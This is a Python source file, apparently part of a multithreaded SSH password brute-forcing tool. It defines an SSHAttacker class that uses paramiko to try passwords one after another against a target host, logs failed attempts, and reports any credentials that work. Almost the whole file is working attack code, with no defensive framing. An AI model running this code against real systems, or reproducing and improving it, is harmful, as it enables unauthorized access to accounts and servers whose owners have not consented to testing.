import paramiko
from target import Target
from attacker import Attacker


class SSHAttacker(Attacker):
    """
    A class representing SSH-attacking thread
    """

    def __init__(self, target: Target):
        super().__init__(target)

    def try_connect(self):
        """
        Try to connect to the host using self.curr_password
        """
        try:
            sshclient = paramiko.SSHClient()
            sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            sshclient.connect(
                hostname=self.target.host,
                port=self.target.port,
                username=self.target.login,
                timeout=3,
                password=self.curr_password,
                allow_agent=False,
                look_for_keys=False
            )
        # authentication failure
        except paramiko.AuthenticationException:
            print("[%s] Failed attempt against %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, self.curr_password))
            self.tries += 1
            self.failed_conns = 0
            self.curr_password = None
        # failed to connect to the host
        except paramiko.SSHException:
            print("[%s] Connection error - %s" % (self.name, self.target.host))
            self.failed_conns += 1
        # failed to connect - other exception
        except Exception:
            print("[%s] Unknown exception while connecting to %s" %
                  (self.name, self.target.host))
            self.failed_conns += 1
        # no exceptions occured -> authentication successful
        else:
            SSHAttacker.notify_password_found(self.curr_password)
            print("[%s] Found credentials for %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, self.curr_password))
            self.tries += 1
            self.failed_conns = 0
            self.curr_password = None
        finally:
            sshclient.close()

    def run(self):
        while SSHAttacker.finish is False:
            if self.curr_password is None:
                self.curr_password = self.target.get_password()
                if self.curr_password is None:
                    continue
            self.try_connect()
